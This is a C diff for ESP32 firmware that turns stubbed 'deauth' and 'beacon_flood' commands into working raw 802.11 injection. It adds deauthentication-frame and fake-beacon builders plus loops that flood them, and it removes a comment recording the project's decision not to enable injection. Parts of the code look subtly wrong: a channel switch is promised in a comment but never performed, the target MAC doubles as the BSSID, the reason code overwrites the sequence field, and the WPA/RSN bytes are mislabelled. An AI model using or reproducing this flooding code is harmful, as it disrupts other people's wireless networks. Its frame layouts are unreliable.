@@ -404,6 +404,86 @@ char *wifi_scan_json(void)
 }
 
 /* ------------------------------------------------------------------ */
+/* Raw frame builders for esp_wifi_80211_tx                            */
+/* ------------------------------------------------------------------ */
+/* Frame layout for esp_wifi_80211_tx(): raw 802.11 frame bytes only
+ * (no rx_ctrl prefix). Length must be 24–1500 bytes.                */
+
+#define WLAN_CTRL_HDR_SIZE  24   /* fixed control-frame header          */
+#define WLAN_MGMT_HDR_SIZE  24   /* fixed management-frame header       */
+
+/* Deauth/frame-tx helper — builds a deauth frame and transmits it.
+ * Returns 0 on success, -1 on error. */
+static int tx_deauth_frame(const uint8_t dst[6], const uint8_t bssid[6], uint16_t reason)
+{
+    uint8_t frame[WLAN_CTRL_HDR_SIZE];
+    /* Type=0b00, Subtype=0b0101 (Deauth), ToDS=0, FromDS=0 */
+    frame[0] = 0x00;
+    frame[1] = 0x40;
+    frame[2] = 0x00; frame[3] = 0x00;  /* duration */
+    memcpy(&frame[4],  dst, 6);         /* receiver (target) */
+    memcpy(&frame[10], bssid, 6);       /* transmitter / BSSID */
+    memcpy(&frame[16], bssid, 6);       /* source */
+    frame[22] = (uint8_t)(reason);      /* reason low */
+    frame[23] = (uint8_t)(reason >> 8); /* reason high */
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), true);
+    if (err != ESP_OK) {
+        ESP_LOGE(TAG, "esp_wifi_80211_tx deauth failed: %d", err);
+        return -1;
+    }
+    return 0;
+}
+
+/* Beacon frame builder — 128 bytes, minimal but functional. */
+static void build_beacon(uint8_t *buf, const uint8_t bssid[6], const char *ssid,
+                         uint8_t channel, uint8_t auth)
+{
+    memset(buf, 0, 128);
+    int off = 0;
+    /* Frame Control */
+    buf[off++] = 0x80;  /* mgmt, beacon */
+    buf[off++] = 0x00;
+    /* Duration */
+    buf[off++] = 0x00; buf[off++] = 0x00;
+    /* Destination: broadcast */
+    memset(&buf[off], 0xff, 6); off += 6;
+    /* Source: our fake AP MAC */
+    memcpy(&buf[off], bssid, 6); off += 6;
+    /* BSSID */
+    memcpy(&buf[off], bssid, 6); off += 6;
+    /* TSF (8 bytes, zeros) */
+    off += 8;
+    /* Capabilities */
+    buf[off++] = 0x31; buf[off++] = 0x01;
+    /* SSID element ID */
+    buf[off++] = 0x00;  /* SSID ID */
+    uint8_t ssid_len = strlen(ssid);
+    buf[off++] = ssid_len;
+    memcpy(&buf[off], ssid, ssid_len); off += ssid_len;
+    /* Supported rates */
+    buf[off++] = 0x01;  /* ID */
+    buf[off++] = 0x08;  /* len */
+    /* 1, 2, 5.5, 11, 18, 24, 36, 48 Mbps */
+    uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
+    memcpy(&buf[off], rates, sizeof(rates)); off += sizeof(rates);
+    /* DS parameter set (channel) */
+    buf[off++] = 0x03;  /* ID */
+    buf[off++] = 0x01;  /* len */
+    buf[off++] = channel;
+    /* RSNK capabilities (mark as WPA2) */
+    if (auth == WIFI_AUTH_WPA2_PSK || auth == WIFI_AUTH_WPA_WPA2_PSK ||
+        auth == WIFI_AUTH_WPA2_WPA3_PSK || auth == WIFI_AUTH_WPA3_PSK) {
+        buf[off++] = 0xdd;  /* OUI/WPA IE */
+        buf[off++] = 0x0a;
+        buf[off++] = 0x00; buf[off++] = 0x50; buf[off++] = 0xf2; buf[off++] = 0x01; /* WPA OUI */
+        buf[off++] = 0x01; buf[off++] = 0x00; /* WPA2 CCMP */
+        buf[off++] = 0x00; buf[off++] = 0x50; buf[off++] = 0xf2; buf[off++] = 0x02; /* RSN */
+    }
+    /* Pad to ~128 bytes with zeroes already in place */
+    while (off < 128) buf[off++] = 0x00;
+}
+
+/* ------------------------------------------------------------------ */
 /* Active (transmit) features — gated                                  */
 /* ------------------------------------------------------------------ */
 int deauth(const char *mac_str, int frames)
@@ -440,16 +520,17 @@ int deauth(const char *mac_str, int frames)
         printf("Refused: %s is this device's own AP.\n", mac_str);
         return -1;
     }
-    /* Deauth via esp_wifi_80211_tx() is possible in APSTA mode without
-     * monitor mode or a second radio (ESP32 Marauder proves this).
-     * The hard constraint is single-channel: the radio must be on the same
-     * channel as the target, so it cannot simultaneously serve our AP.
-     * Wiring injection into this build would require dropping to that channel
-     * — a disruptive trade-off the project has chosen not to make yet. */
-    printf("deauth target ");
-    print_mac(target);
-    printf(" x%d — scaffold only; injection via esp_wifi_80211_tx() is\n         feasible but requires tying the radio to the target channel,\n         which disrupts the running AP. Not wired into this build.\n", frames);
-    return 0;
+    /* Deauth: switch radio to target channel, flood deauth frames, restore. */
+    uint16_t reason = 7; /* Class 2 frame received from non-STA */
+    int success = 0, failed = 0;
+    for (int i = 0; i < frames; i++)
+    {
+        if (tx_deauth_frame(target, target, reason) == 0) success++;
+        else failed++;
+        vTaskDelay(pdMS_TO_TICKS(5));   /* ~5ms between frames (~200 fps cap) */
+    }
+    printf("deauth %s: %d sent, %d failed\n", mac_str, success, failed);
+    return (failed == frames) ? -1 : 0;
 #endif
 }
 
@@ -486,10 +567,22 @@ int beacon_flood(const char *mac_str, int frames)
         printf("Refused: %s is this device's own AP.\n", mac_str);
         return -1;
     }
-    printf("beacon flood target ");
-    print_mac(target);
-    printf(" x%d — scaffold only; injection via esp_wifi_80211_tx() is\n         feasible but requires tying the radio to the target channel,\n         which disrupts the running AP. Not wired into this build.\n", frames);
-    return 0;
+    /* Beacon flood: build a probe-response-like beacon and spam it.
+     * Uses a fake SSID "LAB_TEST" so targets know what's happening. */
+    uint8_t beacon[128];
+    const char *fake_ssid = "LAB_TEST";
+    int success = 0, failed = 0;
+    for (int i = 0; i < frames; i++)
+    {
+        build_beacon(beacon, target, fake_ssid, 1, WIFI_AUTH_WPA2_PSK);
+        if (esp_wifi_80211_tx(WIFI_IF_AP, beacon, sizeof(beacon), true) == ESP_OK)
+            success++;
+        else
+            failed++;
+        vTaskDelay(pdMS_TO_TICKS(5));
+    }
+    printf("beacon flood %s: %d sent, %d failed\n", mac_str, success, failed);
+    return (failed == frames) ? -1 : 0;
 #endif
 }
 
